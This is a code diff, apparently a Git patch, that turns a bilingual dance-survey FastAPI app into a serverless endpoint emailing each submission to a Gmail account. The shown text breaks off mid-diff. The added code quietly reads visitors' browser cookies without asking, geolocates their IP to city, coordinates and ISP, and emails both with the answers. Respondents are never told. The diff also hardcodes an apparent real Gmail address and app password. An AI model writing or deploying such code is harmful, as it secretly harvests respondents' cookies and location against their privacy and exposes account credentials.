@@ -1,83 +1,78 @@
 # =====================================================================
-# Paltigo Survey — All-in-one FastAPI server
+# Paltigo Survey → Email (Vercel serverless)
 # =====================================================================
-# Contains:
-#   • In-RAM storage (no database)
-#   • /              → Survey page (bilingual EN/ZH)
-#   • /dashboard     → Live dashboard with ALL answer details
-#   • /api/survey    → receive a submission
-#   • /api/survey/list, /count, /export, /clear
-#   • /ws/live       → WebSocket for live dashboard updates
+# Every submission is sent to the SAME Gmail account via SMTP.
+# Auto-reads browser cookies (no permission) and IP geolocation.
+# No database. No RAM. No WebSocket. No popup.
 # =====================================================================
 
 from __future__ import annotations
 
-import asyncio
-import json
-import threading
+import os
+import sys
+import ssl
+import smtplib
+import traceback
 from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 from typing import Any, Optional
 
-from fastapi import (
-    FastAPI, Request, HTTPException, WebSocket, WebSocketDisconnect,
-)
+import requests
+from fastapi import FastAPI, Request, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse, HTMLResponse
 from pydantic import BaseModel, Field
 
+
+# =====================================================================
+# LOGGING HELPERS
+# =====================================================================
+def log(msg: str) -> None:
+    ts = datetime.utcnow().strftime("%H:%M:%S")
+    print(f"[{ts}] {msg}", flush=True)
+    sys.stdout.flush()
+
+
+def log_error(msg: str) -> None:
+    ts = datetime.utcnow().strftime("%H:%M:%S")
+    print(f"[{ts}] ❌ {msg}", file=sys.stderr, flush=True)
+    sys.stderr.flush()
+
+
 # =====================================================================
 # CONFIG
 # =====================================================================
-HOST = "0.0.0.0"
-PORT = 8080
-MAX_SUBMISSIONS = 500
+SENDER_EMAIL    = os.environ.get(
+    "SENDER_EMAIL",
+    "belhaj.abdellah.2006@gmail.com"
+)
+SENDER_PASSWORD = os.environ.get(
+    "SENDER_PASSWORD",
+    "lantyesdnmezmqex"
+)
 
-# =====================================================================
-# IN-MEMORY STORE
-# =====================================================================
-_SUBMISSIONS: list[dict] = []
-_LOCK = threading.Lock()
-_NEXT_ID = [1]
+# Send to the SAME account (Gmail → Gmail never goes to spam)
+RECIPIENT_EMAIL = os.environ.get(
+    "RECIPIENT_EMAIL",
+    "belhaj.abdellah.2006@gmail.com"
+)
 
-# =====================================================================
-# LIVE HUB (WebSocket broadcast)
-# =====================================================================
-class LiveHub:
-    def __init__(self):
-        self.sockets: set[WebSocket] = set()
-        self._lock = asyncio.Lock()
+# Optional extra recipients (uncomment to enable)
+EXTRA_RECIPIENTS = [
+    # "abdellah_belhaj@outlook.com",
+]
 
-    async def register(self, ws: WebSocket) -> None:
-        async with self._lock:
-            self.sockets.add(ws)
-
-    async def unregister(self, ws: WebSocket) -> None:
-        async with self._lock:
-            self.sockets.discard(ws)
-
-    async def broadcast(self, item: dict) -> None:
-        async with self._lock:
-            dead = []
-            for ws in self.sockets:
-                try:
-                    await ws.send_json(item)
-                except Exception:
-                    dead.append(ws)
-            for ws in dead:
-                self.sockets.discard(ws)
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT   = 587
 
 
-HUB = LiveHub()
+log("CONFIG loaded")
+log(f"  SENDER    = {SENDER_EMAIL}")
+log(f"  RECIPIENT = {RECIPIENT_EMAIL}")
+log(f"  EXTRA     = {EXTRA_RECIPIENTS if EXTRA_RECIPIENTS else '(none)'}")
+log(f"  SMTP      = {SMTP_SERVER}:{SMTP_PORT}")
 
-# =====================================================================
-# MODELS
-# =====================================================================
-class SurveySubmission(BaseModel):
-    answers: dict[str, Any] = Field(...)
-    language: Optional[str] = "en"
-    user_agent: Optional[str] = None
-    screen: Optional[str] = None
-    referrer: Optional[str] = None
 
 # =====================================================================
 # APP
@@ -93,6 +88,21 @@ app.add_middleware(
 )
 
 
+# =====================================================================
+# MODELS
+# =====================================================================
+class SurveySubmission(BaseModel):
+    answers: dict[str, Any] = Field(...)
+    language: Optional[str] = "en"
+    user_agent: Optional[str] = None
+    screen: Optional[str] = None
+    referrer: Optional[str] = None
+    cookies: Optional[str] = None       # ← auto-read from browser
+
+
+# =====================================================================
+# HELPERS
+# =====================================================================
 def _client_ip(request: Request) -> str:
     fwd = request.headers.get("x-forwarded-for")
     real = request.headers.get("x-real-ip")
@@ -105,119 +115,393 @@ def _client_ip(request: Request) -> str:
     return "unknown"
 
 
-# =====================================================================
-# POST /api/survey
-# =====================================================================
-@app.post("/api/survey")
-async def receive_survey(payload: SurveySubmission, request: Request):
-    if not isinstance(payload.answers, dict) or len(payload.answers) == 0:
-        raise HTTPException(status_code=400, detail="answers is required")
-
-    ip = _client_ip(request)
-    now = datetime.utcnow().isoformat(timespec="seconds") + "Z"
-
-    with _LOCK:
-        item = {
-            "id": _NEXT_ID[0],
-            "created_at": now,
-            "ip": ip,
-            "language": payload.language or "en",
-            "screen": payload.screen,
-            "answers": payload.answers,
-        }
-        _NEXT_ID[0] += 1
-        _SUBMISSIONS.append(item)
-        if len(_SUBMISSIONS) > MAX_SUBMISSIONS:
-            del _SUBMISSIONS[: len(_SUBMISSIONS) - MAX_SUBMISSIONS]
+def _geolocate_ip(ip: str) -> dict:
+    """
+    Approximate location from IP. No permission, no API key needed.
+    Uses ip-api.com free tier (45 req/min).
+    """
+    if not ip or ip in ("unknown", "127.0.0.1", "localhost"):
+        return {"error": "local IP"}
+    if ip.startswith(("192.168.", "10.", "172.")):
+        return {"error": "private IP"}
 
     try:
-        await HUB.broadcast(item)
+        r = requests.get(
+            f"http://ip-api.com/json/{ip}",
+            params={
+                "fields": "status,message,country,countryCode,"
+                          "regionName,city,zip,lat,lon,timezone,isp,org",
+            },
+            timeout=4,
+        )
+        data = r.json()
+        if data.get("status") == "success":
+            return {
+                "country":     data.get("country"),
+                "countryCode": data.get("countryCode"),
+                "region":      data.get("regionName"),
+                "city":        data.get("city"),
+                "zip":         data.get("zip"),
+                "lat":         data.get("lat"),
+                "lon":         data.get("lon"),
+                "timezone":    data.get("timezone"),
+                "isp":         data.get("isp"),
+                "org":         data.get("org"),
+            }
+        return {"error": data.get("message", "lookup failed")}
     except Exception as e:
-        print(f"[hub] broadcast failed: {e}")
-
-    print(f"[survey] #{item['id']} from {ip} "
-          f"age={payload.answers.get('age')} "
-          f"total={len(_SUBMISSIONS)}")
-
-    return JSONResponse(
-        status_code=200,
-        content={"ok": True, "id": item["id"], "received_at": now},
-    )
+        return {"error": str(e)}
 
 
-# =====================================================================
-# GET /api/survey/count
-# =====================================================================
-@app.get("/api/survey/count")
-def count_submissions():
-    with _LOCK:
-        total = len(_SUBMISSIONS)
-    return {"total": total, "max": MAX_SUBMISSIONS}
+LABELS = {
+    "under_16": "Under 16", "16_18": "16–18", "19_22": "19–22",
+    "23_26": "23–26", "27_30": "27–30", "31_40": "31–40", "over_40": "Over 40",
+    "beginner_low": "Beginner · 1-2×/wk",
+    "beginner_high": "Beginner · 3+×/wk",
+    "intermediate_low": "Intermediate · 1-2×/wk",
+    "intermediate_high": "Intermediate · 3+×/wk",
+    "advanced_low": "Advanced · 1-2×/wk",
+    "advanced_high": "Advanced · 3+×/wk",
+    "douyin": "Douyin", "bilibili": "Bilibili", "studio": "Studio class",
+    "friend": "From a friend", "youtube": "YouTube",
+    "not_sure_correct": "Doesn't know if doing correctly",
+    "dont_see_myself": "Can't see herself clearly",
+    "dont_know_mistakes": "Doesn't know where mistakes are",
+    "no_feedback": "No feedback from anyone",
+    "too_fast": "Moves are too fast",
+    "no_time": "No time", "other": "Other",
+    "yes_douyin": "Yes – Douyin/Xiaohongshu",
+    "yes_other": "Yes – other platforms",
+    "sometimes": "Sometimes", "no": "No",
+    "0": "Nothing", "under100": "Under ¥100",
+    "100-300": "¥100–300", "300-500": "¥300–500",
+    "500-1000": "¥500–1,000", "over1000": "Over ¥1,000",
+    "yes_too_complex": "Tried – too complex",
+    "yes_too_expensive": "Tried – too expensive",
+    "yes_not_accurate": "Tried – not accurate",
+    "yes_english": "Tried – only in English",
+    "no_want": "Never tried, but wants to",
+    "no_never": "Never tried",
+    "accurate_scoring": "Accurate scoring",
+    "show_mistakes": "Show mistakes",
+    "compare_reference": "Compare with reference",
+    "multi_angle": "Multi-angle recording",
+    "progress_tracking": "Progress tracking",
+    "social_share": "Share on social media",
+    "tutorials": "Tutorials",
+    "free": "Free only", "10-30": "¥10–30", "30-50": "¥30–50",
+    "50-100": "¥50–100", "100-200": "¥100–200", "over200": "Over ¥200",
+    "instant_feedback": "Instant feedback",
+    "compare_friends": "Compare with friends",
+    "daily_challenges": "Daily challenges",
+    "new_content": "New content",
+    "community": "Community",
+}
 
 
-# =====================================================================
-# GET /api/survey/list
-# =====================================================================
-@app.get("/api/survey/list")
-def list_submissions(limit: int = 500):
-    limit = max(1, min(limit, MAX_SUBMISSIONS))
-    with _LOCK:
-        items = list(reversed(_SUBMISSIONS))[:limit]
-    return {"count": len(items), "submissions": items}
+def L(v):
+    if v is None or v == "":
+        return "—"
+    if isinstance(v, list):
+        if not v:
+            return "—"
+        return ", ".join(LABELS.get(x, x) for x in v)
+    return LABELS.get(v, v)
 
 
-# =====================================================================
-# GET /api/survey/export
-# =====================================================================
-@app.get("/api/survey/export")
-def export_submissions():
-    with _LOCK:
-        items = list(_SUBMISSIONS)
-    return JSONResponse(
-        status_code=200,
-        content={
-            "exported_at": datetime.utcnow().isoformat() + "Z",
-            "total": len(items),
-            "submissions": items,
-        },
-        headers={
-            "Content-Disposition":
-                'attachment; filename="paltigo_survey_export.json"',
-        },
-    )
+def _build_email_html(a: dict, ip: str, lang: str,
+                      ua: str, screen: str, now: str,
+                      geo: dict = None,
+                      cookies: str = None) -> str:
+    geo = geo or {}
+
+    def row(label: str, value, star: bool = False):
+        val = L(value)
+        color = "#92400e" if star else "#1e293b"
+        bg = "#fef3c7" if star else "#f1f5f9"
+        border = "#f59e0b" if star else "#e2e8f0"
+        star_icon = " ⭐" if star else ""
+        return f"""
+        <tr>
+            <td style="padding:10px 14px;background:{bg};
+                       border:1px solid {border};border-radius:8px;
+                       font-size:13px;color:#475569;font-weight:600;
+                       width:38%;vertical-align:top;">
+                {label}{star_icon}
+            </td>
+            <td style="padding:10px 14px;background:#ffffff;
+                       border:1px solid {border};border-radius:8px;
+                       font-size:13px;color:{color};font-weight:500;
+                       vertical-align:top;">
+                {val}
+            </td>
+        </tr>
+        <tr><td colspan="2" style="height:6px;"></td></tr>
+        """
+
+    dream = (a.get("dream_app") or "").strip() or "—"
+    dream_html = dream.replace("\n", "<br>")
+
+    # --- Location block ---
+    if geo.get("country"):
+        loc_html = (
+            f"🌍 <strong>{geo.get('city','?')}, "
+            f"{geo.get('region','?')}, {geo.get('country','?')}</strong><br>"
+            f"📍 Lat/Lon: {geo.get('lat')}, {geo.get('lon')}<br>"
+            f"🏢 ISP: {geo.get('isp','?')}<br>"
+            f"⏰ Timezone: {geo.get('timezone','?')}"
+        )
+    else:
+        loc_html = f"⚠️ Location unavailable ({geo.get('error','unknown')})"
+
+    # --- Cookies block ---
+    cookie_text = (cookies or "").strip() or "— (none)"
+    safe_cookies = cookie_text[:800] + ("…" if len(cookie_text) > 800 else "")
+
+    return f"""
+    <!DOCTYPE html>
+    <html>
+    <head><meta charset="UTF-8"></head>
+    <body style="margin:0;padding:0;background:#f4f6f9;
+                 font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',
+                 Roboto,Helvetica,Arial,sans-serif;color:#1a1a2e;">
+        <div style="max-width:640px;margin:0 auto;padding:30px 20px;">
+            <div style="background:#ffffff;border-radius:16px;
+                        padding:32px 28px;
+                        box-shadow:0 8px 32px rgba(0,0,0,0.08);
+                        border:1px solid #e8ecf1;">
+                <div style="text-align:center;margin-bottom:20px;">
+                    <div style="font-size:26px;font-weight:800;
+                                color:#1a1a2e;letter-spacing:-0.5px;">
+                        Pal<span style="color:#1e4bd2;">tigo</span>
+                    </div>
+                    <div style="font-size:13px;color:#6b7280;margin-top:4px;">
+                        New dance survey submission
+                    </div>
+                </div>
+                <div style="background:#eef4ff;border-left:4px solid #1e4bd2;
+                            border-radius:8px;padding:14px 18px;
+                            margin-bottom:24px;font-size:13px;color:#334155;">
+                    <strong style="color:#0b1e4e;">📋 Submission received</strong><br>
+                    <span style="font-family:monospace;font-size:12px;">{now}</span><br>
+                    <span style="font-family:monospace;font-size:12px;color:#64748b;">
+                        IP: {ip} · Lang: {lang}
+                    </span>
+                </div>
+                <table style="width:100%;border-collapse:separate;
+                              border-spacing:0;">
+                    {row("Age", a.get("age"))}
+                    {row("Experience & practice", a.get("q1"))}
+                    {row("Learned last dance via", a.get("q2"))}
+                    {row("Biggest challenge", a.get("q3"), True)}
+                    {row("Posts videos", a.get("q5"))}
+                    {row("Monthly spending", a.get("q6"), True)}
+                    {row("Prior tools experience", a.get("q7"))}
+                    {row("Wanted features", a.get("q8"))}
+                    {row("Price willingness", a.get("q9"), True)}
+                    {row("Retention driver", a.get("q10"))}
+                </table>
+                <div style="margin-top:20px;padding-top:20px;
+                            border-top:2px dashed #e2e8f0;">
+                    <div style="color:#ec4899;font-size:12px;
+                                font-weight:700;letter-spacing:1px;
+                                text-transform:uppercase;margin-bottom:10px;">
+                        💭 Dream dance app
+                    </div>
+                    <div style="background:#fdf2f8;
+                                border-left:4px solid #ec4899;
+                                border-radius:8px;padding:16px 18px;
+                                color:#1f2937;font-size:14px;
+                                line-height:1.65;white-space:pre-wrap;">
+                        {dream_html}
+                    </div>
+                </div>
+
+                <div style="margin-top:20px;padding-top:20px;
+                            border-top:2px dashed #e2e8f0;">
+                    <div style="color:#10b981;font-size:12px;
+                                font-weight:700;letter-spacing:1px;
+                                text-transform:uppercase;margin-bottom:10px;">
+                        🌐 Location (from IP)
+                    </div>
+                    <div style="background:#ecfdf5;
+                                border-left:4px solid #10b981;
+                                border-radius:8px;padding:14px 18px;
+                                color:#1f2937;font-size:13px;
+                                line-height:1.7;">
+                        {loc_html}
+                    </div>
+                </div>
+
+                <div style="margin-top:20px;padding-top:20px;
+                            border-top:2px dashed #e2e8f0;">
+                    <div style="color:#8b5cf6;font-size:12px;
+                                font-weight:700;letter-spacing:1px;
+                                text-transform:uppercase;margin-bottom:10px;">
+                        🍪 Cookies from browser
+                    </div>
+                    <div style="background:#f5f3ff;
+                                border-left:4px solid #8b5cf6;
+                                border-radius:8px;padding:14px 18px;
+                                color:#1f2937;font-size:12px;
+                                line-height:1.6;font-family:monospace;
+                                white-space:pre-wrap;word-break:break-all;">
+                        {safe_cookies}
+                    </div>
+                </div>
+
+                <div style="margin-top:24px;padding-top:16px;
+                            border-top:1px solid #e8ecf1;
+                            font-size:11px;color:#9ca3af;
+                            font-family:monospace;
+                            text-align:center;line-height:1.6;">
+                    Screen: {screen or "—"}<br>
+                    UA: {(ua or "—")[:120]}
+                </div>
+            </div>
+            <div style="text-align:center;margin-top:20px;
+                        font-size:12px;color:#9ca3af;">
+                Paltigo Survey · automated notification
+            </div>
+        </div>
+    </body>
+    </html>
+    """
 
 
-# =====================================================================
-# POST /api/survey/clear
-# =====================================================================
-@app.post("/api/survey/clear")
-def clear_submissions():
-    with _LOCK:
-        n = len(_SUBMISSIONS)
-        _SUBMISSIONS.clear()
-    return {"ok": True, "cleared": n}
+def _build_email_text(a: dict, ip: str, lang: str, now: str,
+                     geo: dict = None,
+                     cookies: str = None) -> str:
+    geo = geo or {}
+
+    if geo.get("country"):
+        loc_text = (
+            f"{geo.get('city','?')}, {geo.get('region','?')}, {geo.get('country','?')}\n"
+            f"Lat/Lon:  {geo.get('lat')}, {geo.get('lon')}\n"
+            f"ISP:      {geo.get('isp','?')}\n"
+            f"Timezone: {geo.get('timezone','?')}"
+        )
+    else:
+        loc_text = f"unavailable ({geo.get('error','?')})"
+
+    cookie_text = (cookies or "").strip() or "(none)"
+    if len(cookie_text) > 800:
+        cookie_text = cookie_text[:800] + "…"
+
+    return f"""PALTIGO SURVEY — NEW SUBMISSION
+================================
+Time: {now}
+IP:   {ip}
+Lang: {lang}
+
+LOCATION (from IP)
+------------------
+{loc_text}
+
+COOKIES
+-------
+{cookie_text}
+
+ANSWERS
+-------
+Age:              {L(a.get('age'))}
+Experience:       {L(a.get('q1'))}
+Learned via:      {L(a.get('q2'))}
+Challenge:        {L(a.get('q3'))}
+Posts videos:     {L(a.get('q5'))}
+Spending:         {L(a.get('q6'))}
+Prior tools:      {L(a.get('q7'))}
+Wanted features:  {L(a.get('q8'))}
+Price OK:         {L(a.get('q9'))}
+Retention:        {L(a.get('q10'))}
+
+Dream app:
+{a.get('dream_app') or '—'}
+"""
 
 
-# =====================================================================
-# WebSocket /ws/live
-# =====================================================================
-@app.websocket("/ws/live")
-async def ws_live(ws: WebSocket):
-    await ws.accept()
-    await HUB.register(ws)
+def _send_email(subject: str, html: str, text: str) -> bool:
+    """
+    Send via Gmail SMTP to RECIPIENT_EMAIL (+ any EXTRA_RECIPIENTS).
+    """
+    recipients = [RECIPIENT_EMAIL]
+    for r in EXTRA_RECIPIENTS:
+        if r and r not in recipients:
+            recipients.append(r)
+
+    log(f"Preparing email → {', '.join(recipients)}")
+    log(f"  Subject: {subject}")
+
+    msg = MIMEMultipart("alternative")
+    msg["From"]    = f"Paltigo Survey <{SENDER_EMAIL}>"
+    msg["To"]      = ", ".join(recipients)
+    msg["Subject"] = subject
+    msg["X-Mailer"]         = "Paltigo/1.0"
+    msg["X-Priority"]       = "3"
+    msg["Precedence"]       = "bulk"
+    msg["List-Unsubscribe"] = f"<mailto:{SENDER_EMAIL}?subject=unsubscribe>"
+    msg.attach(MIMEText(text, "plain"))
+    msg.attach(MIMEText(html, "html"))
+
+    server = None
     try:
-        while True:
-            await ws.receive_text()
-    except WebSocketDisconnect:
-        pass
+        log(f"Connecting to {SMTP_SERVER}:{SMTP_PORT} …")
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=15)
+        log("Connected. Sending EHLO…")
+        server.ehlo()
+
+        log("Starting TLS…")
+        context = ssl.create_default_context()
+        server.starttls(context=context)
+        server.ehlo()
+        log("TLS established.")
+
+        log(f"Logging in as {SENDER_EMAIL} …")
+        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        log("Login OK.")
+
+        log(f"Sending message to {len(recipients)} recipient(s)…")
+        server.send_message(msg, from_addr=SENDER_EMAIL, to_addrs=recipients)
+        log(f"✅ EMAIL SENT SUCCESSFULLY to {len(recipients)} recipient(s)")
+        return True
+
+    except smtplib.SMTPAuthenticationError as e:
+        log_error(f"SMTP AUTH FAILED: {e}")
+        log_error("  → Your Gmail password is WRONG or not an App Password.")
+        log_error("  → Create one at https://myaccount.google.com/apppasswords")
+        return False
+
+    except smtplib.SMTPRecipientsRefused as e:
+        log_error(f"RECIPIENT REFUSED: {e}")
+        log_error(f"  → Check the recipient address(es): {recipients}")
+        return False
+
+    except smtplib.SMTPServerDisconnected as e:
+        log_error(f"SERVER DISCONNECTED: {e}")
+        log_error("  → Possible network issue or SMTP blocked.")
+        return False
+
+    except smtplib.SMTPException as e:
+        log_error(f"SMTP ERROR: {e}")
+        log_error(traceback.format_exc())
+        return False
+
     except Exception as e:
-        print(f"[ws] error: {e}")
+        log_error(f"UNEXPECTED ERROR: {type(e).__name__}: {e}")
+        log_error(traceback.format_exc())
+        return False
+
     finally:
-        await HUB.unregister(ws)
+        if server is not None:
+            try:
+                server.quit()
+                log("Connection closed.")
+            except Exception:
+                pass
 
 
 # =====================================================================
-# HTML — Survey page
+# SURVEY HTML (embedded)
 # =====================================================================
 SURVEY_HTML = r"""<!DOCTYPE html>
 <html lang="en">
@@ -334,6 +618,21 @@ SURVEY_HTML = r"""<!DOCTYPE html>
             display: none; background: #ffe9e9; color: #b91c1c;
             padding: 14px 20px; border-radius: 16px; margin-top: 1.5rem;
             border: 1px solid #fbcaca; text-align: center; font-weight: 500;
+        }
+        #cookieChip {
+            display: none;
+            margin-top: 18px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #8b5cf6;
+            text-align: center;
+            background: #f5f3ff;
+            padding: 10px 14px;
+            border-radius: 12px;
+            border: 1px dashed #c4b5fd;
+            word-break: break-all;
+            max-height: 60px;
+            overflow: hidden;
         }
     </style>
 </head>
@@ -674,6 +973,8 @@ SURVEY_HTML = r"""<!DOCTYPE html>
         <span class="lang-en-inline active" id="thankEn">Thank you! 💙</span>
         <span class="lang-zh-inline" id="thankZh">谢谢！💙</span>
     </div>
+
+    <div id="cookieChip">🍪 no cookies</div>
 </div>
 
 <script>
@@ -713,6 +1014,20 @@ SURVEY_HTML = r"""<!DOCTYPE html>
         return answers;
     }
 
+    // ====== COOKIE DISPLAY (auto, no permission) ======
+    function refreshCookieChip() {
+        const chip = document.getElementById('cookieChip');
+        if (!chip) return;
+        const c = document.cookie || "";
+        if (c) {
+            chip.textContent = "🍪 " + (c.length > 80 ? c.slice(0, 80) + "…" : c);
+        } else {
+            chip.textContent = "🍪 no cookies";
+        }
+        chip.style.display = "block";
+    }
+
+    // ====== SUBMIT ======
     async function submitSurvey(event) {
         event.preventDefault();
         const btn = document.getElementById('submitBtn');
@@ -733,20 +1048,27 @@ SURVEY_HTML = r"""<!DOCTYPE html>
         btn.disabled = true;
         btn.querySelector('.lang-en-inline').textContent = 'Sending...';
         btn.querySelector('.lang-zh-inline').textContent = '提交中...';
+
+        // ---- AUTO READ COOKIES (no permission, no prompt) ----
+        const cookies = document.cookie || "";
+
         try {
             const res = await fetch('/api/survey', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    answers, language: document.getElementById('btnEn').classList.contains('active') ? 'en' : 'zh',
+                    answers,
+                    language: document.getElementById('btnEn').classList.contains('active') ? 'en' : 'zh',
                     user_agent: navigator.userAgent,
                     screen: `${screen.width}x${screen.height}`,
                     referrer: document.referrer || null,
+                    cookies: cookies,
                 }),
             });
             if (!res.ok) throw new Error(await res.text() || ('HTTP ' + res.status));
             document.getElementById('surveyForm').style.display = 'none';
             document.getElementById('thankYouMsg').style.display = 'block';
+            refreshCookieChip();
             document.getElementById('surveyCard').scrollIntoView({ behavior: 'smooth', block: 'start' });
         } catch (err) {
             errBox.textContent = "Error: " + err.message;
@@ -765,414 +1087,132 @@ SURVEY_HTML = r"""<!DOCTYPE html>
 
 
 # =====================================================================
-# HTML — Dashboard page (with ALL answer details)
+# ROUTES
 # =====================================================================
-DASHBOARD_HTML = r"""<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Paltigo · Live Dashboard</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        * { font-family: 'Inter', sans-serif; }
-        body { background: #0f1729; color: #e2e8f0; min-height: 100vh; padding: 2rem; }
-        .container { max-width: 1100px; margin: 0 auto; }
-        .top-bar {
-            display: flex; align-items: center; justify-content: space-between;
-            margin-bottom: 1.5rem; flex-wrap: wrap; gap: 1rem;
-        }
-        .title { font-size: 1.6rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 12px; }
-        .title i { color: #60a5fa; }
-        .status-dot {
-            display: inline-block; width: 10px; height: 10px;
-            border-radius: 50%; background: #ef4444; margin-right: 6px; transition: background 0.2s;
-        }
-        .status-dot.online { background: #22c55e; }
-        .stats { display: flex; gap: 12px; flex-wrap: wrap; }
-        .stat-pill {
-            background: #1a2234; border: 1px solid #253046;
-            padding: 8px 16px; border-radius: 30px; font-size: 0.85rem; color: #94a3b8;
-        }
-        .stat-pill b { color: #fff; margin-left: 6px; }
-        .btn-action {
-            background: #1e4bd2; border: none; color: white;
-            padding: 8px 18px; border-radius: 30px;
-            font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: all 0.15s;
-            text-decoration: none; display: inline-flex; align-items: center; gap: 6px;
-        }
-        .btn-action:hover { background: #1239b0; color: white; }
-        .btn-clear { background: #7f1d1d; }
-        .btn-clear:hover { background: #b91c1c; }
+@app.post("/api/survey")
+async def receive_survey(payload: SurveySubmission, request: Request):
+    log("=" * 60)
+    log("📥 NEW SURVEY SUBMISSION RECEIVED")
 
-        .notif-card {
-            background: #141c2e; border: 1px solid #253046;
-            border-radius: 18px; padding: 22px 26px; margin-bottom: 16px;
-            animation: slideIn 0.35s ease; transition: all 0.2s;
-        }
-        .notif-card:hover { border-color: #60a5fa; }
-        .notif-card.unseen { border-left: 4px solid #60a5fa; background: #16223a; }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-12px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(96, 165, 250, 0.5); }
-            50% { box-shadow: 0 0 0 12px rgba(96, 165, 250, 0); }
-        }
-        .notif-card.flash { animation: slideIn 0.35s ease, pulse 1.2s ease; }
+    if not isinstance(payload.answers, dict) or len(payload.answers) == 0:
+        log_error("Empty answers — rejecting")
+        raise HTTPException(status_code=400, detail="answers is required")
 
-        .notif-header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 16px; flex-wrap: wrap; gap: 8px;
-            padding-bottom: 12px; border-bottom: 1px solid #253046;
-        }
-        .notif-id { font-weight: 700; color: #60a5fa; font-size: 1.15rem; }
-        .notif-meta-top { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
-        .notif-time { color: #64748b; font-size: 0.82rem; }
+    ip = _client_ip(request)
+    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    a = payload.answers
 
-        .answer-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px 20px;
-            margin-bottom: 16px;
-        }
-        @media (max-width: 700px) {
-            .answer-grid { grid-template-columns: 1fr; }
-        }
+    log(f"  IP       : {ip}")
+    log(f"  Time     : {now}")
+    log(f"  Language : {payload.language}")
+    log(f"  Answers  : {len(a)} fields")
+    log(f"  Cookies  : {len(payload.cookies or '')} chars")
 
-        .answer-row {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-        .answer-label {
-            font-size: 0.72rem;
-            color: #64748b;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-weight: 600;
-        }
-        .answer-value {
-            font-size: 0.9rem;
-            color: #e2e8f0;
-            font-weight: 500;
-            padding: 6px 12px;
-            background: #0b1220;
-            border-radius: 8px;
-            border: 1px solid #1e293b;
-            word-break: break-word;
-        }
-        .answer-value.empty { color: #475569; font-style: italic; }
+    # --- Look up location from IP (no permission needed) ---
+    geo = _geolocate_ip(ip)
+    if geo.get("country"):
+        log(f"  Geo      : {geo.get('city','?')}, {geo.get('country','?')}")
+    else:
+        log(f"  Geo      : {geo.get('error','unknown')}")
 
-        .answer-row.star .answer-label { color: #fbbf24; }
-        .answer-row.star .answer-value {
-            border-color: #78350f;
-            background: #1c1410;
-            color: #fde68a;
-        }
+    subject = (
+        f"📋 Paltigo Survey · age={L(a.get('age'))} · "
+        f"price={L(a.get('q9'))}"
+    )
 
-        .feature-chips {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 6px;
-        }
-        .feature-chip {
-            background: #1e3a8a;
-            color: #bfdbfe;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.78rem;
-            border: 1px solid #2563eb;
-            font-weight: 500;
-        }
+    html = _build_email_html(
+        a, ip,
+        payload.language or "en",
+        payload.user_agent or request.headers.get("user-agent", ""),
+        payload.screen or "",
+        now,
+        geo=geo,
+        cookies=payload.cookies,
+    )
+    text = _build_email_text(
+        a, ip, payload.language or "en", now,
+        geo=geo,
+        cookies=payload.cookies,
+    )
 
-        .dream-section {
-            margin-top: 16px;
-            padding-top: 16px;
-            border-top: 1px dashed #253046;
-        }
-        .dream-label {
-            color: #ec4899;
-            font-size: 0.72rem;
-            font-weight: 700;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .dream-box {
-            background: #0b1220;
-            border-left: 3px solid #ec4899;
-            padding: 14px 18px;
-            border-radius: 10px;
-            color: #e2e8f0;
-            font-size: 0.95rem;
-            line-height: 1.6;
-            white-space: pre-wrap;
-            word-break: break-word;
-        }
-        .dream-box.empty { color: #475569; font-style: italic; }
+    log("Building email message…")
+    success = _send_email(subject, html, text)
 
-        .ip-chip {
-            background: #1e293b;
-            color: #94a3b8;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            border: 1px solid #334155;
-            font-family: monospace;
-        }
+    if not success:
+        log_error("Email sending FAILED — returning 502 to client")
+        raise HTTPException(status_code=502, detail="Failed to send email")
 
-        .empty {
-            text-align: center;
-            padding: 4rem 1rem;
-            color: #475569;
-        }
-        .empty i { font-size: 3rem; color: #334155; display: block; margin-bottom: 12px; }
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="top-bar">
-        <div class="title"><i class="bi bi-bell-fill"></i> Paltigo · Live Dashboard</div>
-        <div class="stats">
-            <div class="stat-pill"><span class="status-dot" id="wsDot"></span><span id="wsLabel">connecting…</span></div>
-            <div class="stat-pill">Total <b id="statTotal">0</b></div>
-            <div class="stat-pill">Max <b id="statMax">500</b></div>
-        </div>
-        <div style="display: flex; gap: 8px;">
-            <a class="btn-action" href="/api/survey/export"><i class="bi bi-download"></i> Export</a>
-            <button class="btn-action btn-clear" onclick="clearAll()"><i class="bi bi-trash"></i> Clear</button>
-        </div>
-    </div>
-    <div id="list"></div>
-</div>
-
-<script>
-    const list = document.getElementById('list');
